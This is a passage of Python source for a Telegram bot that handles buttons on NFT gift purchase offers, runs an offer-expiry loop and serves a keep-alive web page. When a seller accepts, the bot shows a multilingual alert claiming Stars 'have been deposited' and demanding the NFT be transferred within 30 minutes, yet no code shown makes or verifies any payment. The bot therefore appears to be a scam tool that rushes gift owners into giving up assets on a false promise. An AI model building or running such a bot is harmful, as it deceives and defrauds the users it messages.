        current = database.get_offer(offer_id)
    except (ValueError, LookupError):
        return
    business_connection_id = callback.message.business_connection_id or ""
    if business_connection_id != current.business_connection_id: return
    if parts[1] == "help":
        await bot.edit_message_text(chat_id=callback.message.chat.id, message_id=callback.message.message_id, text=transfer_help_caption(current), parse_mode=ParseMode.HTML, reply_markup=back_keyboard(current), **({"business_connection_id": business_connection_id} if business_connection_id else {}))
        await safe_callback_answer(callback, "تم" if is_arabic(current) else "完成" if is_chinese(current) else "Done" if is_english(current) else "Готово")
        return
    if parts[1] == "back":
        await bot.edit_message_text(chat_id=callback.message.chat.id, message_id=callback.message.message_id, text=accepted_caption(current), parse_mode=ParseMode.HTML, link_preview_options=nft_preview_options(current.gift_url), reply_markup=accepted_keyboard(current), **({"business_connection_id": business_connection_id} if business_connection_id else {}))
        await safe_callback_answer(callback, "تم" if is_arabic(current) else "完成" if is_chinese(current) else "Done" if is_english(current) else "Готово")
        return
    if parts[1] == "transfer":
        transfer_hint = "Open the buyer profile and transfer the gift in Telegram." if is_english(current) else "请打开买家资料，并在 Telegram 中转移礼物。" if is_chinese(current) else "افتح ملف المشتري وانقل الهدية عبر Telegram." if is_arabic(current) else "Откройте профиль покупателя и передайте подарок через Telegram."
        await safe_callback_answer(callback, transfer_hint, show_alert=True)
        return
    if parts[1] == "accept":
        warning = "⚠️ Stars have been deposited to Telegram system. Transfer the NFT within 30 minutes or the offer will be cancelled." if is_english(current) else "⚠️ 星星已存入 Telegram 系统。请在30分钟内转移NFT，否则报价将被取消。" if is_chinese(current) else "⚠️ تم إيداع النجوم في نظام Telegram. انقل NFT خلال 30 دقيقة وإلا سيتم إلغاء العرض." if is_arabic(current) else "⚠️ Звёзды внесены в систему Telegram. Передайте NFT в течение 30 минут, иначе оффер будет отменён."
        await safe_callback_answer(callback, warning, show_alert=True)
        new_status = "accepted"
    else:
        new_status = "declined"
    offer = database.take_pending_offer(offer_id, new_status)
    if offer is None:
        database.expire_old_offers()
        current = database.get_offer(offer_id)
        await safe_callback_answer(callback, "العرض تمت معالجته أو انتهت صلاحيته" if is_arabic(current) else "报价已处理。" if is_chinese(current) else "Предложение уже обработано или истекло", show_alert=True)
        return
    if offer.status == "declined":
        try:
            if business_connection_id:
                await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[callback.message.message_id])
            else:
                await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
        except TelegramBadRequest:
            logger.exception("Could not delete declined offer message %s", offer.id)
        await safe_callback_answer(callback, callback_status_text(offer))
        return
    try:
        await bot.edit_message_text(chat_id=callback.message.chat.id, message_id=callback.message.message_id, text=accepted_caption(offer), parse_mode=ParseMode.HTML, link_preview_options=nft_preview_options(offer.gift_url), reply_markup=accepted_keyboard(offer), **({"business_connection_id": business_connection_id} if business_connection_id else {}))
    except TelegramBadRequest:
        logger.exception("Could not update offer message %s", offer.id)
    await safe_callback_answer(callback, callback_status_text(offer))

async def expiry_worker() -> None:
    while True:
        try:
            expired = database.expire_old_offers()
            if expired: logger.info("Expired %s offer(s)", expired)
        except Exception:
            logger.exception("Offer expiry worker failed")
        await asyncio.sleep(60)

async def handle_ping(request):
    return web.Response(text="Bot is running 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"Web server started on port {port}")

async def main() -> None:
    global config, database
    config = Config.from_env()
    database = OfferDatabase(config.database_path)
    bot = Bot(token=config.bot_token)
    dispatcher = Dispatcher()
    dispatcher.include_router(router)
    
    await start_web_server()
    
    expiry_task = asyncio.create_task(expiry_worker())
    try:
        await dispatcher.start_polling(bot, allowed_updates=dispatcher.resolve_used_update_types())
    finally:
        expiry_task.cancel()
        database.close()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped")
